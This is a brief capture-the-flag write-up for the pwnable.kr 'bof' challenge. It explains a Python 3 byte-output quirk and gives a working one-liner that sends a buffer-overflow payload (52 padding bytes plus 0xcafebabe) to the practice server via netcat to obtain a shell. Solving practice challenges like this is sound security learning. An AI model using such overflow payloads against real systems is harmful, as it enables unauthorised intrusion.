# bof

## The Challenge

Nana told me that buffer overflow is one of the most common software vulnerability. Is that true?

Running at : nc pwnable.kr 9000

## Solution

### One Liner

It turns out that python3 print\(\) function encodes characters as a sequence of Unicode characters instead of a sequence of bytes \[[link](https://stackoverflow.com/questions/32017389/write-different-hex-values-in-python2-and-python3)\]. Instead of print\(\), sys.stdout.buffer.write was used.

```text
(python3 -c "import sys; sys.stdout.buffer.write(b'A' * 52 + b'\xbe\xba\xfe\xca\n')" && cat) | nc pwnable.kr 9000
```

